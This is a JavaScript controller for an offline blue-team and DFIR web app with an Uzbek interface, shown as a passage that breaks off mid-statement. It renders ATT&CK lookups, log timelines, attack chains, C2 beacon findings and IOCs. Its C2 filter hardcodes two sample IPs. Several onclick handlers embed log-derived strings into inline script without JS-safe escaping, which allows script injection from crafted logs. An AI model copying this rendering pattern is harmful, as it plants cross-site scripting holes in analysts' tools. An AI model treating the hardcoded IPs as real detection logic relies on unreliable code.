// BlueKit — DFIR & Blue Team Web App Controller (100% Offline)

let currentLogResult = null;
let currentTimelineEvents = [];
let filteredTimeline = [];
let currentPage = 1;
let pageSize = 50;
let activeFilterChip = 'all';
let hideCleanChains = false;
let slaTimer = null;
let slaStates = {};

function showToast(msg) {
    const t = document.getElementById('toast');
    if (!t) return;
    t.innerText = msg;
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2200);
}

function copyText(text, event) {
    if (event) event.stopPropagation();
    if (!text) return;
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            showToast("✓ Nusxalandi: " + text.slice(0, 35) + (text.length > 35 ? '...' : ''));
        }).catch(() => fallbackCopy(text));
    } else {
        fallbackCopy(text);
    }
}

function fallbackCopy(text) {
    const el = document.createElement('textarea');
    el.value = text;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
    showToast("✓ Nusxalandi!");
}

function escapeHtml(str) {
    if (str === null || str === undefined) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

function showTab(id) {
    if (slaTimer && id !== 'resp') {
        clearInterval(slaTimer);
        slaTimer = null;
        const chk = document.getElementById('sla-auto-chk');
        if (chk) chk.checked = false;
    }
    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
    const target = document.getElementById(id);
    if (target) target.classList.add('active');
    if (event && event.currentTarget) event.currentTarget.classList.add('active');
    if (id === 'tracker') loadTracker();
    if (id === 'playbook') loadPlaybook();
    if (id === 'siem') loadSiemMeta();
}

async function api(path, method='GET', body=null) {
    const opts = { method, headers: {} };
    if (body) {
        opts.headers['Content-Type'] = 'application/json';
        opts.body = JSON.stringify(body);
    }
    const res = await fetch(path, opts);
    const text = await res.text();
    try {
        return JSON.parse(text);
    } catch(e) {
        return {error: text};
    }
}

function renderTable(headers, rows) {
    if (!rows || rows.length === 0) return '<p style="color:var(--text-dim); padding:10px;">Natija topilmadi</p>';
    let html = '<div class="table-responsive"><table><thead><tr>' + headers.map(h => `<th>${h}</th>`).join('') + '</tr></thead><tbody>';
    for (let row of rows) {
        html += '<tr>' + row.map((c, i) => {
            if (c === 'revoked') return `<td><span class="badge badge-high">REVOKED</span></td>`;
            if (c === 'MISSING') return `<td><span class="coverage-pill missing">MISSING</span></td>`;
            if (c === 'COVERED') return `<td><span class="badge badge-success">COVERED</span></td>`;
            return `<td>${c !== undefined && c !== null ? c : ''}</td>`;
        }).join('') + '</tr>';
    }
    html += '</tbody></table></div>';
    return html;
}

function addToTrackerForm(id) {
    showTab('tracker');
    const trkField = document.getElementById('trk-c');
    if (trkField) trkField.value = id;
    showToast(`🎯 '${id}' Trackerga kiritildi`);
}

function trackerBtn(id) {
    return `<button class="action-btn btn-trk" onclick="event.stopPropagation(); addToTrackerForm('${id}')">➕ Tracker</button>`;
}

function copyBtn(text) {
    return `<button class="action-btn" title="Nusxa olish" onclick="event.stopPropagation(); copyText('${escapeHtml(text)}')">📋</button>`;
}

async function showMitreModal(attackId, event) {
    if (event) event.stopPropagation();
    const backdrop = document.getElementById('modal-backdrop');
    const modal = document.getElementById('mitre-modal');
    const body = document.getElementById('modal-body');
    const title = document.getElementById('modal-title');
    
    title.innerText = `[${attackId}] Qidirilmoqda...`;
    body.innerHTML = '<div class="spinner-container"><div class="spinner"></div><p style="color:var(--text-muted); font-size:12px;">MITRE ATT&CK bazasidan olinmoqda...</p></div>';
    backdrop.classList.add('active');
    modal.style.display = 'block';

    const res = await api(`/api/id?id=${encodeURIComponent(attackId)}`);
    if (res.error || !res || !res.length) {
        title.innerText = `[${attackId}]`;
        body.innerHTML = `<p style="color:var(--red);">Ma'lumot topilmadi: ${res.error || 'Bunday ID yo\'q'}</p>`;
        return;
    }
    const t = res[0];
    const isRev = t.status === 'revoked';
    title.innerHTML = `[${t.attack_id}] ${escapeHtml(t.name)} ${isRev ? '<span class="badge badge-high">REVOKED</span>' : '<span class="badge badge-success">ACTIVE</span>'}`;
    
    let html = '';
    if (isRev && t.revoked_by) {
        html += `<div style="background:var(--red-bg); border:1px solid var(--red-border); padding:10px 14px; border-radius:var(--radius-md); margin-bottom:14px; color:var(--red);">
            <b>⚠️ DIQQAT:</b> Ushbu ID eskirgan (revoked). O'rniga yangi ID: 
            <span class="tech-tag" onclick="showMitreModal('${t.revoked_by}')">${t.revoked_by}</span> ni ishlating!
        </div>`;
    }
    html += `
        <div class="detail-row"><span class="detail-key">Taktikalar:</span><span class="detail-val">${(t.tactics||[]).join(', ')}</span></div>
        <div class="detail-row"><span class="detail-key">Platformalar:</span><span class="detail-val">${t.platforms || 'All'}</span></div>
        <div class="detail-row"><span class="detail-key">Qisqacha Tavsif:</span>
            <div style="font-size:12.5px; line-height:1.6; color:var(--text-main); margin-top:4px; max-height:180px; overflow-y:auto; padding:8px; background:var(--bg-input); border-radius:var(--radius-md); border:1px solid var(--border);">
                ${escapeHtml(t.short_description || t.description || 'Tavsif yo\'q')}
            </div>
        </div>
        <div style="margin-top:16px; display:flex; gap:10px;">
            <button class="btn btn-sm btn-primary" onclick="copyText('${t.attack_id}')">📋 ID Nusxalash</button>
            <button class="btn btn-sm btn-secondary" onclick="addToTrackerForm('${t.attack_id}'); closeModal();">➕ Trackerga qo'shish</button>
            <a class="btn btn-sm btn-secondary" href="${t.url || ('https://attack.mitre.org/techniques/' + t.attack_id.replace('.', '/'))}" target="_blank" style="text-decoration:none;">🔗 MITRE Sahifasi</a>
        </div>
    `;
    body.innerHTML = html;
}

function closeModal() {
    const backdrop = document.getElementById('modal-backdrop');
    const modal = document.getElementById('mitre-modal');
    if (backdrop) backdrop.classList.remove('active');
    if (modal) modal.style.display = 'none';
}

function showEventDrawer(index) {
    const ev = currentTimelineEvents[index];
    if (!ev) return;
    const drawer = document.getElementById('event-drawer');
    const backdrop = document.getElementById('drawer-backdrop');
    const title = document.getElementById('drawer-title');
    const content = document.getElementById('drawer-content');
    
    title.innerText = `Hodisa #${ev.index !== undefined ? ev.index : index} — ${ev.host || 'Noma\'lum'}`;
    
    let techHtml = '';
    if (ev.techniques && ev.techniques.length) {
        techHtml = ev.techniques.map(t => {
            const confClass = t.confidence ? `badge-${t.confidence}` : 'badge-low';
            return `
            <div style="background:var(--bg-input); padding:10px 14px; border-radius:var(--radius-md); border:1px solid var(--border); margin-bottom:8px;">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <span class="tech-tag" onclick="showMitreModal('${t.technique}', event)">${t.technique}</span>
                    <span class="badge ${confClass}">${t.confidence || 'info'}</span>
                </div>
                <div style="font-weight:700; font-size:13px; margin-top:6px; color:#fff;">${escapeHtml(t.name || '')}</div>
                <div style="font-size:11.5px; color:var(--text-muted); margin-top:4px;">${escapeHtml(t.evidence || '')}</div>
                <div style="margin-top:8px; display:flex; gap:6px;">
                    <button class="action-btn btn-sm" onclick="copyText('${t.technique}', event)">📋 ID Nusxa</button>
                    <button class="action-btn btn-trk btn-sm" onclick="addToTrackerForm('${t.technique}'); closeDrawer();">➕ Tracker</button>
                </div>
            </div>`;
        }).join('');
    } else {
        techHtml = '<p style="color:var(--text-dim); font-size:12px;">ATT&CK texnikasi belgilanmagan</p>';
    }
    
    content.innerHTML = `
        <div class="detail-row"><span class="detail-key">Vaqt (Timestamp):</span><span class="detail-val">${escapeHtml(ev.ts_disp || ev.ts || 'N/A')}</span></div>
        <div class="detail-row"><span class="detail-key">Host / Kompyuter:</span><span class="detail-val">${escapeHtml(ev.host || 'N/A')}</span></div>
        <div class="detail-row"><span class="detail-key">Foydalanuvchi (User):</span><span class="detail-val">${escapeHtml(ev.user || 'N/A')}</span></div>
        <div class="detail-row"><span class="detail-key">Jarayon (Process):</span><span class="detail-val">${escapeHtml(ev.process || 'N/A')} (Parent: ${escapeHtml(ev.parent_process || 'N/A')})</span></div>
        <div class="detail-row">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <span class="detail-key">Buyruq Satri (Command Line):</span>
                <button class="action-btn" onclick="copyText('${escapeHtml(ev.command_line_full || ev.command_line || '')}', event)">📋 Nusxalash</button>
            </div>
            <div class="detail-val" style="white-space:pre-wrap; max-height:130px; overflow-y:auto;">${escapeHtml(ev.command_line_full || ev.command_line || 'N/A')}</div>
        </div>
        <div class="detail-row">
            <span class="detail-key">Aniqlangan Texnikalar (${(ev.techniques||[]).length}):</span>
            ${techHtml}
        </div>
        <div class="detail-row">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
                <span class="detail-key">Xom Log Qatori (Raw JSON):</span>
                <button class="action-btn" onclick="copyText(JSON.stringify(currentTimelineEvents[${index}].raw || currentTimelineEvents[${index}], null, 2), event)">📋 JSON Nusxa</button>
            </div>
            <pre style="max-height:220px;">${escapeHtml(JSON.stringify(ev.raw || ev, null, 2))}</pre>
        </div>
    `;
    backdrop.classList.add('active');
    drawer.classList.add('active');
}

function closeDrawer() {
    const backdrop = document.getElementById('drawer-backdrop');
    const drawer = document.getElementById('event-drawer');
    if (backdrop) backdrop.classList.remove('active');
    if (drawer) drawer.classList.remove('active');
}

// ==================== KB Functions ====================
// sources API'dan {sigma: 8, atomic: 8} ko'rinishida keladi
function fmtSources(s) {
    if (!s) return '';
    if (Array.isArray(s)) return s.join(', ');
    return Object.entries(s).map(([k, v]) => `${k}:${v}`).join(', ');
}

async function kbSearch() {
    const q = document.getElementById('kb-search-in').value;
    if (!q) return;
    const out = document.getElementById('kb-search-out');
    out.innerHTML = '<div class="spinner-container"><div class="spinner"></div></div>';
    let res;
    try {
        res = await api(`/api/search?q=${encodeURIComponent(q)}&n=20`);
    } catch (e) {
        return out.innerText = 'Server bilan aloqa xatosi: ' + e.message;
    }
    if (res.error) return out.innerText = res.error;
    if (!Array.isArray(res)) return out.innerText = 'Kutilmagan javob';
    const rows = res.map(r => [
        `<span class="tech-tag" onclick="showMitreModal('${r.attack_id}')">${r.attack_id}</span>`,
        escapeHtml(r.name),
        r.score.toFixed(3),
        `<span class="badge badge-${r.confidence}">${r.confidence}</span>`,
        fmtSources(r.sources),
        trackerBtn(r.attack_id) + ' ' + copyBtn(r.attack_id)
    ]);
    out.innerHTML = renderTable(['ID', 'Name', 'Score', 'Conf', 'Sources', 'Action'], rows);
}

async function kbValidate() {
    const ids = document.getElementById('kb-val-in').value;
    if (!ids) return;
    const out = document.getElementById('kb-val-out');
    out.innerHTML = '<div class="spinner-container"><div class="spinner"></div></div>';
    const res = await api(`/api/validate?ids=${encodeURIComponent(ids)}`);
    if (res.error) return out.innerText = res.error;
    const rows = res.map(r => {
        const isRev = r.status === 'revoked';
        const statusBadge = isRev ? '<span class="badge badge-high">REVOKED</span>' : (r.status === 'active' ? '<span class="badge badge-success">ACTIVE</span>' : `<span class="badge badge-medium">${r.status}</span>`);
        const repHtml = r.replacement ? `<span class="tech-tag" style="border-color:var(--green); color:var(--green);" onclick="showMitreModal('${r.replacement}')">${r.replacement} (YANGI ID)</span>` : '—';
        return [
            `<b>${escapeHtml(r.input)}</b>`,
            statusBadge,
            escapeHtml(r.name || ''),
            repHtml,
            r.replacement ? copyBtn(r.replacement) : copyBtn(r.input)
        ];
    });
    out.innerHTML = renderTable(['Kiritilgan ID', 'Holati', 'Texnika Nomi', 'Tavsiya Qilingan Almashtirish', 'Nusxa'], rows);
}

async function kbRelated() {
    const ids = document.getElementById('kb-rel-in').value;
    if (!ids) return;
    const out = document.getElementById('kb-rel-out');
    out.innerHTML = '<div class="spinner-container"><div class="spinner"></div></div>';
    const actors = document.getElementById('kb-rel-actors').checked ? '1' : '0';
    const res = await api(`/api/related?ids=${encodeURIComponent(ids)}&actors=${actors}`);
    if (res.error) return out.innerText = res.error;
    
    let html = '';
    if (res.techniques) {
        const rows = res.techniques.map(r => [
            `<span class="tech-tag" onclick="showMitreModal('${r.attack_id}')">${r.attack_id}</span>`,
            escapeHtml(r.name),
            `<span class="badge badge-medium">${r.probability}</span>`,
            r.support,
            (r.reasons||[]).join(', '),
            trackerBtn(r.attack_id)
        ]);
        html += renderTable(['ID', 'Name', 'Ehtimollik', 'Support', 'Sabablar', 'Action'], rows);
    }
    if (res.actors && res.actors.length) {
        html += '<h4 style="margin-top:20px; color:#fff;">O\'xshash TTP Aktorlari (Attribution emas):</h4>';
        const rows = res.actors.map(a => [
            `<b>${escapeHtml(a.name)}</b>`,
            a.type,
            `${a.matched_ids.length}`,
            (a.top_unobserved||[]).map(u => `<span class="tech-tag" onclick="showMitreModal('${u}')">${u}</span>`).join(' ')
        ]);
        html += renderTable(['Aktor Nomi', 'Turi', 'Mos Kelgan', 'Kuzatilmagan Texnikalar'], rows);
    }
    out.innerHTML = html;
}

async function kbIoc() {
    const v = document.getElementById('kb-ioc-in').value;
    if (!v) return;
    const out = document.getElementById('kb-ioc-out');
    out.innerHTML = '<div class="spinner-container"><div class="spinner"></div></div>';
    const res = await api(`/api/ioc?v=${encodeURIComponent(v)}&n=5`);
    if (res.error) return out.innerText = res.error;
    if (!res.classification) return out.innerText = "Aniqlanmadi";
    let html = `<p style="margin-bottom:10px;">Aniqlangan Tur: <span class="badge badge-medium">${res.classification.type}</span> &nbsp; Qiymat: <code>${escapeHtml(res.classification.value)}</code></p>`;
    if (res.techniques && res.techniques.length) {
        const rows = res.techniques.map(t => [
            `<span class="tech-tag" onclick="showMitreModal('${t.attack_id}')">${t.attack_id}</span>`,
            escapeHtml(t.name),
            (t.score||0).toFixed(3),
            `<span class="badge badge-${t.confidence}">${t.confidence}</span>`,
            trackerBtn(t.attack_id)
        ]);
        html += renderTable(['ID', 'Name', 'Score', 'Conf', 'Action'], rows);
    }
    out.innerHTML = html;
}

async function kbTactics() {
    const ids = document.getElementById('kb-tac-in').value;
    if (!ids) return;
    const out = document.getElementById('kb-tac-out');
    out.innerHTML = '<div class="spinner-container"><div class="spinner"></div></div>';
    const res = await api(`/api/tactics?ids=${encodeURIComponent(ids)}`);
    if (res.error) return out.innerText = res.error;
    const rows = res.map(r => [
        `<b>${r.shortname}</b>`,
        escapeHtml(r.name),
        r.missing ? 'MISSING' : 'COVERED',
        (r.observed||[]).map(o => `<span class="tech-tag" onclick="showMitreModal('${o}')">${o}</span>`).join(' ')
    ]);
    out.innerHTML = renderTable(['Taktika ID', 'Nomi', 'Status', 'Kuzatilgan Texnikalar'], rows);
}

async function buildLogInputBody() {
    let body = {};
    const fileInput = document.getElementById('log-file');
    const pathElem = document.getElementById('log-path');
    const path = pathElem ? pathElem.value : '';
    
    if (fileInput && fileInput.files.length > 1) {
        const files = [];
        for (const file of fileInput.files) {
            const content = await new Promise(r => { const rd = new FileReader(); rd.onload = e => r(e.target.result); rd.readAsText(file); });
            files.push({content: content, filename: file.name, mtime: file.lastModified});
        }
        body = {files: files};
    } else if (fileInput && fileInput.files.length > 0) {
        const file = fileInput.files[0];
        const content = await new Promise(r => { const rd = new FileReader(); rd.onload = e => r(e.target.result); rd.readAsText(file); });
        body = {content: content, filename: file.name};
    } else if (path.includes('\n') || path.includes(',')) {
        body = {content: path, filename: 'upload.csv'};
    } else if (path.trim()) {
        body = {path: path.trim()};
    } else {
        alert("Iltimos, fayl tanlang yoki yo'l kiriting!");
        return null;
    }
    const tzSelect = document.getElementById('log-src-tz');
    const tzVal = tzSelect ? tzSelect.value : '+05:00';
    body.src_tz = tzVal;
    return body;
}

// ==================== Logs Analyzer ====================
async function logAnalyze() {
    const btn = document.getElementById('btn-log-analyze');
    
    const body = await buildLogInputBody();
    if (!body) return;
    
    for (const [id, key] of [['log-from', 'from'], ['log-to', 'to'], ['log-host', 'host']]) {
        const v = (document.getElementById(id)?.value || '').trim();
        if (v) body[key] = v;
    }
    
    if (btn) btn.disabled = true;
    document.getElementById('log-out').innerHTML = `
        <div class="card spinner-container">
            <div class="spinner"></div>
            <p style="color:var(--text-main); font-weight:600; font-size:14px;">Loglar tahlil qilinmoqda...</p>
            <p style="color:var(--text-dim); font-size:12px;">ATT&CK korrelyatsiyasi, C2 va Timeline shajarasi yig'ilmoqda</p>
        </div>
    `;
    
    const res = await api('/api/logs/analyze', 'POST', body);
    if (btn) btn.disabled = false;
    if (res.error) return document.getElementById('log-out').innerHTML = `<div class="card" style="color:var(--red); border-color:var(--red-border);">${escapeHtml(res.error)}</div>`;
    
    currentLogResult = res;
    currentTimelineEvents = (res.timeline || []).map((t, idx) => {
        t._originalIndex = idx;
        return t;
    });
    
    renderLogsDashboard(res);
}

function clearLogFilters() {
    for (const id of ['log-from', 'log-to', 'log-host']) {
        const el = document.getElementById(id);
        if (el) el.value = '';
    }
}

function downloadLogAnalysisJson() {
    if (!currentLogResult) return showToast("Avval loglarni tahlil qiling");
    downloadBlob(JSON.stringify(currentLogResult, null, 2), 'log_analysis.json', 'application/json');
}

function renderLogsDashboard(res) {
    const totalEvents = currentTimelineEvents.length;
    const totalChains = (res.chains || []).length;
    const coveredTactics = (res.coverage || []).filter(c => !c.missing).length;
    const checkersCount = (res.checkers || []).length;
    
    let html = '';
    
    if (res.stats && res.stats.filter) {
        let f = res.stats.filter;
        let p_host = f.host ? `host=${escapeHtml(String(f.host))}` : '';
        let p_from = f.from ? escapeHtml(String(f.from).replace('T', ' ').slice(0, 19)) : '...';
        let p_to = f.to ? escapeHtml(String(f.to).replace('T', ' ').slice(0, 19)) : '...';
        let parts = [];
        if (p_host) parts.push(p_host);
        if (f.from || f.to) parts.push(`${p_from} .. ${p_to}`);
        
        html += `<div class="card" style="border-color:var(--amber); padding:10px 14px; margin-bottom:12px;">`;
        html += `🔎 Filtr: ${parts.join(', ')} — <b>${escapeHtml(String(res.stats.events))}</b> / ${escapeHtml(String(f.loaded))} hodisa`;
        if (res.stats.events === 0) {
            html += `<div style="color:var(--amber); margin-top:8px;">Filtrdan keyin hodisa qolmadi — Dan/Gacha Toshkent vaqtida yoziladi — jadvalda qavs ichidagi (Toshkent ...) vaqtni oling, qavs bo'lmasa ko'rsatilgan vaqtni.</div>`;
        }
        html += `</div>`;
    }
    
    html += `
        <div style="display:flex; justify-content:flex-end; margin-bottom: 12px;">
            <button class="btn btn-secondary btn-sm" onclick="downloadLogAnalysisJson()" title="Responder tabidagi 'Log Analyzer natijasi' maydoniga shu faylni bering">💾 Responder uchun JSON yuklab olish</button>
        </div>
        <!-- KPI Cards Grid -->
        <div class="grid-4" style="margin-bottom: 20px;">
            <div class="stat-card">
                <span class="stat-label">Jami Hodisalar</span>
                <span class="stat-val">${totalEvents.toLocaleString()}</span>
            </div>
            <div class="stat-card">
                <span class="stat-label">Zanjirlar (Chains)</span>
                <span class="stat-val">${totalChains}</span>
            </div>
            <div class="stat-card warning">
                <span class="stat-label">Qamralgan Taktikalar</span>
                <span class="stat-val">${coveredTactics}</span>
            </div>
            <div class="stat-card danger">
                <span class="stat-label">C2 / Davriy Trafik</span>
                <span class="stat-val">${checkersCount}</span>
            </div>
        </div>

        <!-- ATT&CK Coverage Matrix -->
        <div class="card">
            <div class="card-title">
                <span>Cyber Kill Chain Qamrovi</span>
                <span class="brand-badge">${coveredTactics} / ${(res.coverage||[]).length} Taktika</span>
            </div>
            <div class="coverage-grid">
    `;
    
    if (res.coverage) {
        for (let c of res.coverage) {
            if (c.missing) {
                html += `<div class="coverage-pill missing"><b>${escapeHtml(c.name)}</b>: MISSING</div>`;
            } else {
                const techBadges = c.observed.map(t => `<span class="tech-tag" onclick="showMitreModal('${t}', event)">${t}</span>`).join(' ');
                html += `<div class="coverage-pill observed"><b>${escapeHtml(c.name)}</b>: ${techBadges}</div>`;
            }
        }
    }
    html += `
            </div>
        </div>

        <!-- Timeline Section with Quick Filters & Pagination -->
        <div class="card">
            <div class="card-title">
                <span>⏱ Hodisalar Xronologiyasi (Timeline)</span>
                <span id="timeline-count-badge" class="brand-badge">${totalEvents} ta hodisa</span>
            </div>

            <!-- Quick Filter Chips -->
            <div class="filter-chips">
                <span style="font-size:12px; color:var(--text-dim); margin-right:4px;">Tezkor Filtr:</span>
                <div class="filter-chip active" id="chip-all" onclick="setFilterChip('all')">Barchasi (${totalEvents})</div>
                <div class="filter-chip" id="chip-high" onclick="setFilterChip('high_medium')">🔴 Faqat High / Medium</div>
                <div class="filter-chip" id="chip-compromised" onclick="setFilterChip('compromised')">🛡 Faqat Zararlangan Hostlar</div>
                <div class="filter-chip" id="chip-c2" onclick="setFilterChip('c2')">📡 C2 / Davriy Aloqalar</div>
            </div>

            <!-- Search Inputs Bar -->
            <div class="filter-bar">
                <input type="text" id="log-f-host" placeholder="Host (masalan: web-prod-01)" onkeyup="triggerFilterDebounced()">
                <input type="text" id="log-f-tech" placeholder="Texnika (masalan: T1190)" onkeyup="triggerFilterDebounced()">
                <input type="text" id="log-f-free" placeholder="Matn (masalan: UNION, curl, root)" onkeyup="triggerFilterDebounced()">
                <label class="checkbox-label">
                    <input type="checkbox" id="log-f-low" onclick="applyFilters()">
                    Past ishonchlilarini yashirish (Hide Low)
                </label>
                <button class="action-btn" onclick="resetFilters()">Tozalash</button>
            </div>

            <!-- Timeline Table Container -->
            <div id="timeline-table-container"></div>
            
            <!-- Pagination Controls -->
            <div id="pagination-bar" class="pagination-container"></div>
        </div>

        <!-- Attack Chains Section -->
        <div class="card">
            <div class="card-title">
                <span>⛓ Hujum Zanjirlari (Chains)</span>
                <label class="checkbox-label">
                    <input type="checkbox" id="chk-hide-clean" onchange="toggleCleanChains(this.checked)">
                    Toza kompyuterlarni yashirish (Faqat zararlanganlar)
                </label>
            </div>
            <div class="chain-grid" id="chain-cards-container">
    `;
    
    if (res.chains) {
        for (let c of res.chains) {
            const hasTactics = c.tactics && c.tactics.length > 0;
            const compClass = hasTactics ? 'compromised' : 'clean';
            const tacticsPills = hasTactics 
                ? c.tactics.map(t => `<span class="tactic-pill">${escapeHtml(t)}</span>`).join('') 
                : '<span style="color:var(--text-dim); font-size:11px;">no tactics (toza)</span>';
            
            html += `
                <div class="chain-card ${compClass}" data-clean="${!hasTactics}">
                    <div class="chain-header">
                        <span class="chain-host">Host: ${escapeHtml(c.host)}</span>
                        ${hasTactics ? '<span class="badge badge-high">⚠️ ATTACK CHAIN</span>' : '<span class="badge badge-low">CLEAN</span>'}
                    </div>
                    <div style="font-size:11.5px; color:var(--text-muted);">Foydalanuvchi: <b>${escapeHtml(c.user || 'N/A')}</b> · Hodisalar: ${c.events ? c.events.length : 0} ta</div>
                    <div class="chain-tactics">${tacticsPills}</div>
                    <div style="margin-top:10px;">
                        <button class="action-btn btn-sm" onclick="filterByHost('${escapeHtml(c.host)}')">Faqat ushbu hostni ko'rish</button>
                    </div>
                </div>
            `;
        }
    }
    html += `
            </div>
        </div>

        <!-- Checker / Beacon Section -->
        <div class="card">
            <div class="card-title">
                <span>📡 Checker / C2 Beacon (Davriy trafik deteksiyasi)</span>
                <span class="brand-badge" style="border-color:var(--red); color:var(--red);">Tekshiring</span>
            </div>
            <p style="font-size:12px; color:var(--text-muted); margin-bottom:12px;">
                Doimiy interval bilan takrorlanuvchi ulanishlar. CTF scoreboard checkeri YOKI tajovuzkorning C2 kanali bo'lishi mumkin!
            </p>
    `;
    if (res.checkers && res.checkers.length) {
        const rows = res.checkers.map(c => [
            `<code>${escapeHtml(c.src || '')}</code>`,
            `<code>${escapeHtml(c.dst || '')}</code>`,
            `<span class="badge badge-medium">${c.interval_seconds != null ? c.interval_seconds + 's' : ''}</span>`,
            `<b>${c.count || ''}</b>`,
            escapeHtml(c.first_disp || c.first || ''),
            escapeHtml(c.last_disp || c.last || ''),
            copyBtn(c.dst || '') + ' ' + `<button class="action-btn" onclick="filterByDst('${escapeHtml(c.dst||'')}')">Filtrlash</button>`
        ]);
        html += renderTable(['Manba IP (Src)', 'Nishon IP (Dst)', 'Davriylik (Interval)', 'Soni', 'Boshlanish', 'Tugash', 'Action'], rows);
    } else {
        html += '<p style="color:var(--text-dim); font-size:12.5px;">Davriy trafik (checker/beacon) topilmadi.</p>';
    }
    html += `
        </div>

        <!-- IOC Section -->
        <div class="card">
            <div class="card-title">
                <span>🎯 Ajratib Olingan IOC Indikatorlari</span>
                <span class="brand-badge">${(res.iocs||[]).length} ta IOC</span>
            </div>
    `;
    if (res.iocs && res.iocs.length) {
        const rows = res.iocs.map(i => [
            `<span class="badge badge-low">${escapeHtml(i.type || '')}</span>`,
            `<code class="code-cell">${escapeHtml(i.value || '')}</code>`,
            `<b>${i.count || ''}</b>`,
            escapeHtml(i.first_disp || i.first || ''),
            escapeHtml(i.last_disp || i.last || ''),
            copyBtn(i.value || '')
        ]);
        html += renderTable(['Turi', 'Indikator (Qiymat)', 'Chastotasi', 'Birinchi ko\'rindi', 'Oxirgi ko\'rindi', 'Nusxa'], rows);
    } else {
        html += '<p style="color:var(--text-dim); font-size:12.5px;">IOC topilmadi.</p>';
    }
    html += '</div>';

    document.getElementById('log-out').innerHTML = html;
    
    // Apply default filters and render timeline page
    applyFilters();
}

let filterDebounceTimer = null;
function triggerFilterDebounced() {
    clearTimeout(filterDebounceTimer);
    filterDebounceTimer = setTimeout(applyFilters, 150);
}

function setFilterChip(chip) {
    activeFilterChip = chip;
    document.querySelectorAll('.filter-chip').forEach(el => el.classList.remove('active'));
    const activeEl = document.getElementById(`chip-${chip}`);
    if (activeEl) activeEl.classList.add('active');
    applyFilters();
}

function filterByHost(host) {
    const hostInput = document.getElementById('log-f-host');
    if (hostInput) hostInput.value = host;
    setFilterChip('all');
    applyFilters();
    window.scrollTo({ top: document.getElementById('timeline-table-container').offsetTop - 120, behavior: 'smooth' });
}

function filterByDst(ip) {
    const freeInput = document.getElementById('log-f-free');
    if (freeInput) freeInput.value = ip;
    applyFilters();
    window.scrollTo({ top: document.getElementById('timeline-table-container').offsetTop - 120, behavior: 'smooth' });
}

function resetFilters() {
    const h = document.getElementById('log-f-host'); if (h) h.value = '';
    const t = document.getElementById('log-f-tech'); if (t) t.value = '';
    const f = document.getElementById('log-f-free'); if (f) f.value = '';
    const l = document.getElementById('log-f-low'); if (l) l.checked = false;
    setFilterChip('all');
}

function toggleCleanChains(hide) {
    hideCleanChains = hide;
    const cards = document.querySelectorAll('.chain-card[data-clean="true"]');
    cards.forEach(c => {
        c.style.display = hide ? 'none' : 'block';
    });
}

function applyFilters() {
    if (!currentTimelineEvents || !currentTimelineEvents.length) return;
    
    const hostVal = (document.getElementById('log-f-host')?.value || '').toLowerCase().trim();
    const techVal = (document.getElementById('log-f-tech')?.value || '').toLowerCase().trim();
    const freeVal = (document.getElementById('log-f-free')?.value || '').toLowerCase().trim();
    const hideLow = document.getElementById('log-f-low')?.checked || false;
    
    // Compromised hosts set from chains
    const compHosts = new Set();
    if (currentLogResult && currentLogResult.chains) {
        currentLogResult.chains.forEach(c => {
            if (c.tactics && c.tactics.length > 0 && c.host) compHosts.add(c.host.toLowerCase());
        });
    }

    filteredTimeline = currentTimelineEvents.filter(ev => {
        const conf = (ev.primary_confidence || '').toLowerCase();
        
        // Quick chip filter
        if (activeFilterChip === 'high_medium') {
            if (conf !== 'high' && conf !== 'medium') return false;
        } else if (activeFilterChip === 'compromised') {
            if (!ev.host || !compHosts.has(ev.host.toLowerCase())) return false;
        } else if (activeFilterChip === 'c2') {
            const rawStr = JSON.stringify(ev.raw || ev).toLowerCase();
            if (!rawStr.includes('203.0.113.88') && !rawStr.includes('198.51.100.45')) return false;
        }
        
        // Hide low-confidence checkbox
        if (hideLow && conf === 'low') return false;
        
        // Host filter
        if (hostVal && !(ev.host || '').toLowerCase().includes(hostVal)) return false;
        
        // Technique filter
        if (techVal) {
            const tMatch = (ev.techniques || []).some(t => (t.technique || '').toLowerCase().includes(techVal) || (t.name || '').toLowerCase().includes(techVal));
            if (!tMatch) return false;
        }
        
        // Free text filter
        if (freeVal) {
            const fullText = ((ev.command_line_full || ev.command_line || '') + ' ' + (ev.host || '') + ' ' + (ev.user || '') + ' ' + (ev.message || '')).toLowerCase();
            if (!fullText.includes(freeVal)) return false;
        }
        
        return true;
    });

    currentPage = 1;
    renderTimelinePage();
}

function renderTimelinePage() {
    const container = document.getElementById('timeline-table-container');
    const paginationBar = document.getElementById('pagination-bar');
    const countBadge = document.getElementById('timeline-count-badge');
    if (!container) return;
    
    const total = filteredTimeline.length;
    if (countBadge) countBadge.innerText = `${total.toLocaleString()} ta mos keldi`;
    
    if (total === 0) {
        container.innerHTML = '<div style="padding:40px; text-align:center; color:var(--text-dim); font-size:14px;">Filtrlarga mos keluvchi hodisalar topilmadi</div>';
        if (paginationBar) paginationBar.innerHTML = '';
        return;
    }
    
    const totalPages = Math.ceil(total / pageSize) || 1;
    if (currentPage > totalPages) currentPage = totalPages;
    if (currentPage < 1) currentPage = 1;
    
    const startIdx = (currentPage - 1) * pageSize;
    const endIdx = Math.min(startIdx + pageSize, total);
    const pageItems = filteredTimeline.slice(startIdx, endIdx);
    
    let tableHtml = `
        <div class="table-responsive">
            <table>
                <thead>
                    <tr>
                        <th style="width:170px;">Vaqt (Timestamp)</th>
                        <th style="width:130px;">Host</th>
                        <th>Buyruq / Hodisa Xabari</th>
                        <th style="width:160px;">ATT&amp;CK Texnikalari</th>
                        <th style="width:90px;">Xavf</th>
                        <th style="width:120px;">Harakat</th>
                    </tr>
                </thead>
                <tbody>
    `;
    
    for (let t of pageItems) {
        const conf = t.primary_confidence || 'none';
        const badgeClass = conf === 'high' ? 'badge-high' : (conf === 'medium' ? 'badge-medium' : (conf === 'low' ? 'badge-low' : ''));
        const cmdDisplay = escapeHtml(t.command_line || t.message || '');
        const fullCmd = escapeHtml(t.command_line_full || t.command_line || t.message || '');
        
        const techTags = (t.techniques || [])
